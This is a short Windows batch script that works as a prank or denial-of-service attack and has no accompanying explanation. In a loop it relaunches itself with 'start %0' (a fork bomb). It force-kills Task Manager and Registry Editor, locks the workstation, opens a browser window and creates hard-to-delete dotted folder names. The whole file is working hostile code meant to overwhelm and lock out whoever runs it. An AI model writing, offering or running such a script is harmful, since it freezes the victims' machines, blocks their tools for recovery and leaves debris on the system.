@echo off
:1
title=
@echo 
mode con cols=14 lines=1
start %0
taskkill /f /im taskmgr.exe
taskkill /f /im regedit.exe
start iexplore.exe http://www.baidu.com/forbiddenip/
start rundll32.exe user32.dll,LockWorkStation 
ping -n 1 127.0>nul
set dd=%date:~8,2%
set mm=%date:~5,2%
set yy=%date:~0,4%
set Tss=%TIME:~6,2%
set Tmm=%TIME:~3,2%
set Thh=%TIME:~0,2%
set Thh=%Thh: =0%
set folder="%yy%.%mm%.%dd%.%Thh%.%Tmm%.%Tss%"
md \............................................................................................................................................................................\
goto 1 >nul 2>nul
md %folder% 
md .............................................................................................................................................................................\

